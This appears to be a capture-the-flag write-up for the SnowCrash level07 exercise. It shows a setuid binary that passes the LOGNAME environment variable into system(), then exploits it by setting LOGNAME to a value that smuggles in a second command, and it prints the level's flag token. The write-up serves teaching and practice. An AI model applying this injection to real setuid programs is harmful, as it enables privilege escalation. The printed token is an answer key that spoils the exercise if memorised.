@@ -1,0 +1,43 @@
+level07@SnowCrash:~$ ls -l level07
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+
+level07@SnowCrash:~$ file level07
+level07: setuid setgid ELF 32-bit LSB executable
+
+level07@SnowCrash:~$ ./level07
+level07
+
+==========================================================
+# Ok, i managed to get the file on the host machine in order to reverse it
+	but when i started the binary it prints my login
+➜  Snowcrash git:(master) ✗ ./level07bin
+lumenthi
+
+# Let's reverse
+   0x0804851d <+9>:		call   0x80483f0 <getegid@plt>
+   0x08048526 <+18>:	call   0x80483e0 <geteuid@plt>
+   0x08048546 <+50>:	call   0x8048450 <setresgid@plt>
+   0x08048562 <+78>:	call   0x80483d0 <setresuid@plt>
+   0x08048576 <+98>:	call   0x8048400 <getenv@plt>
+   0x0804857b <+103>:	mov    DWORD PTR [esp+0x8],eax
+   0x0804857f <+107>:	mov    DWORD PTR [esp+0x4],0x8048688
+   0x08048587 <+115>:	lea    eax,[esp+0x14]
+   0x0804858b <+119>:	mov    DWORD PTR [esp],eax
+   0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
+   0x0804859a <+134>:	call   0x8048410 <system@plt>
+
+# From what i see, the binary is printing a env variable
+➜  Snowcrash git:(master) ✗ strings level07bin
+[...]
+LOGNAME
+/bin/echo %s
+[...]
+
+# To be more accurate, it echo the LOGNAME variable :)
+	-> /bin/echo LOGNAME
+==========================================================
+
+# So our goal will be to exploit the env so we can run getflag
+level07@SnowCrash:~$ export LOGNAME=" ; getflag"
+level07@SnowCrash:~$ ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
